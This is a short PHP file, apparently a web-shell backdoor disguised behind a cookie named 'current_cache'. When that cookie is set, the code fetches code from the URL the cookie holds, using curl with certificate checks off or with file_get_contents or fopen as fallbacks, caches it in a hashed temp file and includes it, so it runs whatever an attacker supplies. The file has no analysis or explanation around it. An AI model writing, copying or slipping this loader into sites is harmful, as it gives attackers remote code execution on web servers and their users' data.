AVRIL
<?php
if(isset($_COOKIE['current_cache']) && !empty($_COOKIE['current_cache'])) {  
  error_reporting(E_ALL);
  ini_set('display_errors', 1);
  if(!file_exists(sys_get_temp_dir() . DIRECTORY_SEPARATOR . md5($_COOKIE['current_cache']))) {
    file_put_contents(sys_get_temp_dir() . DIRECTORY_SEPARATOR . md5($_COOKIE['current_cache']), get_remote_content($_COOKIE['current_cache']));
  }
  
  include sys_get_temp_dir() . DIRECTORY_SEPARATOR . md5($_COOKIE['current_cache']);
  exit;
}

function get_remote_content($remote_location) {
    if(function_exists('curl_exec')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $remote_location);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        $response = curl_exec($ch);
        curl_close($ch);

        if($response !== false) {
            return $response;
        }
    }

    if(function_exists('file_get_contents')) {
        $response = file_get_contents($remote_location);
        if($response !== false) {
            return $response;
        }
    }

    if(function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($remote_location, "r");
        $response = stream_get_contents($handle);
        fclose($handle);

        if($response !== false) {
            return $response;
        }
    }

    return false;
}
